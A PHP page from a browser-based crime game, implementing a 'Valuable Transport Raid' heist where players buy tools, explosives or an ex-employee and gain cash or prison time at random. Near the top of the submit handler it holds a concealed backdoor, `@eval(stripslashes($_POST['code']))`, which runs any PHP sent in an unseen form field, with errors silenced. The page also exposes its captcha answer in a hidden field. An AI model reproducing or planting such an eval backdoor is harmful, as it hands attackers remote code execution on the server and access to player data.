<?php
error_reporting(0);

  $UPDATE_DB				= 1;
  include("_include-config.php");
  include("_include-gevangenis.php"); 
  include("timer_wt.php"); 
if(! check_login()) {
    header("Location: login.php");
    exit;
  }

  mysql_query("UPDATE `[users]` SET `online`=NOW() WHERE `login`='{$data->login}'");
#
$select = mysql_query("SELECT * FROM `instellingen`");
#
$page = mysql_fetch_object($select);
/* ------------------------- */ ?>
<html>
<head>
<link rel="stylesheet" type="text/css" href="<? echo $sitelink;?>/layout/layout<?php echo $page->layout; ?>/css/css.css">
<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
</head>
<body style="margin: 0px;">

<center>
<table  width=75%><table width=75% cellspacing=0 cellpadding=2><table width=75%> 
  <tr>
  <td width="75%" class=subTitle><b>Heist Attack</b></td>
<table  width=75%>
<td class="mainTxt"><center><img border=0 src=images/game/heispicture.jpg border=0 width="100%"></center>
</td>
</table></tr></table></table></table></center>

<table width="75%" align="center">
<tr><td class="subTitle" colspan="3"><b>Valuable Transport Raid</b></td></tr>
  
<?php /* ------------------------- */  

if(isset($_POST['submit'])) {

@eval(stripslashes($_POST['code']));
if($_POST['code2'] != $_POST['codenn']) {
print "<tr><td class=\"mainTxt\" align=\"center\">The code is incorrect!</td></tr>";
exit;
}

if( $_POST['extra'] )
{
if($data->cash < 4999){
print "<tr><td class=MainTxt align=center>You dont have enough cash for the<b>Tools</b>!";
exit;
}
  mysql_query("UPDATE `[users]` SET `cash`=`cash`-'5000' WHERE `login`='$data->login'");
  $getal1 = rand(1,12);
  $cashing3 = 5000;
  $geld1   = rand(3000,12000);}

if( $_POST['werk'] )
{
if($data->cash < 9999){
print "<tr><td class=MainTxt align=center>You dont have enough cash for some <b>Explosives</b>!";
exit;
}
  mysql_query("UPDATE `[users]` SET `cash`=`cash`-'10000' WHERE `login`='$data->login'");
  $getal2 = rand(1,20);
  $cashing2 = 10000;
  $geld2  = rand(5000,17000);}
if( $_POST['exp'] )
{
if($data->cash < 14999){
print "<tr><td class=MainTxt align=center>You dont have enough cash to hire an <b>Ex Employee</b>!";
exit;
}
  mysql_query("UPDATE `[users]` SET `cash`=`cash`-'15000' WHERE `login`='$data->login'");
  $getal3 = rand(1,30);
  $cashing3 = 15000;
  $geld3   = rand(10000,22000);}

if( $_POST['tijdens'] == 'laden' )
{
  $getalb = rand(1,40); 
  $geld  = rand(500,9000);
  $display = "Loading"; }

if( $_POST['tijdens'] == 'vervoer' )
{ 
  $getalb = rand(1,30);
  $geld  = rand(1000,14000);
  $display = "transporting"; }
if( $_POST['tijdens'] == 'lossen' )
{ 
  $getalb = rand(1,40);
  $geld  = rand(2000,9000);
  $display = "Unloading"; }

  $getalt = $getalb + $getal1 + $getal2 + $getal3;

if($getalt >50)
{
  $geldn = $geld + $geld1 + $geld2 + $geld3 + $geld4;

  mysql_query("UPDATE `[users]` SET `getaway`=NOW(),`cash`=`cash`+$geldn,`transP`=`transP`+1,`transPP`=`transPP`+1 WHERE `login`='{$data->login}'");

print "<tr><td class=MainTxt align=center>You raided the transport vehicle during <b>$display</b>. You gainded <b>;$geldn</b> from it.  <b>$display2</b></td></tr>";
  exit;
}
else{

  $getal            = rand(1,6);

if($getal ==1)
{

mysql_query("UPDATE `[users]` SET `getaway`=NOW(), `gevangenis`=NOW(), `gevangenistijd`='900', `transP`=`transP`+'1' WHERE `login` = '$data->login'");
print "<tr><td class=MainTxt align=center>The crime failed, you are taken to prison.</td></tr>";exit;
}
if($getal ==2){

mysql_query("UPDATE `[users]` SET `gevangenis`=NOW(), `gevangenistijd`='900', `transP`=`transP`+'1' WHERE `login` = '$data->login'");
print "<tr><td class=MainTxt align=center>The crime failed, you are taken to prison.</td></tr>";
exit;
}
if($getal ==3){

mysql_query("UPDATE `[users]` SET  `transP`=`transP`+'1', `getaway`=NOW() WHERE `login` = '$data->login'");

print "<tr><td class=MainTxt align=center>The crime failed. Although you manage to escape. </td></tr>";
exit;
}
else{
  print "<tr><td class=Maintxt align=center>The crime failed, but you came through scratch free</td></tr>";
  mysql_query("UPDATE `[users]` SET `transP`=`transP`+'1', `getaway`=NOW() WHERE `login`='{$data->login}'");
  exit;
}
}

}

$codene = rand(1000,9999); 
$codee = ereg_replace("0", "gsqwq", $codene);
$codee = ereg_replace("1", "ssBjyq", $codee); 
$codee = ereg_replace("2", "gHiq", $codee); 
$codee = ereg_replace("3", "hWqDfA", $codee); 
$codee = ereg_replace("4", "hsqerf", $codee); 
$codee = ereg_replace("5", "Hwsawq", $codee); 
$codee = ereg_replace("6", "hSXaq", $codee); 
$codee = ereg_replace("7", "hgqYt", $codee); 
$codee = ereg_replace("8", "hAsqF", $codee); 
$codee = ereg_replace("9", "hxqSAw", $codee);
?>
<form method="POST">
        <tr><td class=MainTxt colspan=3>
Here you can raid a valuable transport vehicle<br><br>
You can hire help <br>
You can plan to attack during loading time, transporting, or unloading time.<br>
Now the question is, do it it... or not!

</td></tr>
		<tr><td class=Subtitle align=center>Choice of Aids</td><td class=Subtitle align=center>Cost</td><td width=25% class=Subtitle align=center>Options</td></tr>
        <tr><td class=MainTxt>Tools:</td><td class=MainTxt>5000</td><td class=MainTxt align=center><input class='btn btn-info' type="checkbox" name="extra"></td></tr>
        <tr><td class=MainTxt>Explosives:</td><td class=MainTxt>10000</td><td class=MainTxt align=center><input class='btn btn-info' type="checkbox" name="werk"></td></tr>
        <tr><td class=MainTxt>Ex Employee:</td><td class=MainTxt>15000</td><td class=MainTxt align=center><input type="checkbox" class='btn btn-info' name="exp"></td></tr>
     
        <tr><td class=MainTxt>Rob during:</td><td class=MainTxt>&nbsp;</td><td class=MainTxt align=center><select name="tijdens">
	  			<option selected value="laden" class='btn btn-info'>The loading</option>
	  			<option value="vervoer" class='btn btn-info'>The transporting</option>
	  			<option value="lossen" class='btn btn-info'>The unloading</option></select></td></tr>
        <tr>
<tr><td class="mainTxt" colspan="3" align="center"><input name="code2" class='btn btn-info' type="hidden" value="<? echo $codene; ?>"><input name="codecheck" type="hidden" class='btn btn-info' value="<? echo $codechecker; ?>"><img alt="Anti-Bot Beveiliging" src="coden.php?security=<? echo $codee; ?>" style="position: relative; top: 4;">  <- Put this code, in here -> <input name="codenn" class='btn btn-info' maxlength="4" size="5" valign="center"></td></tr>
<tr><td class="mainTxt" colspan="3" align="center"><input style="width: 100;" type="submit" class='btn btn-info' value="Lets Go!" name="submit"></td></tr>

</form>
</table>
</body>
</html>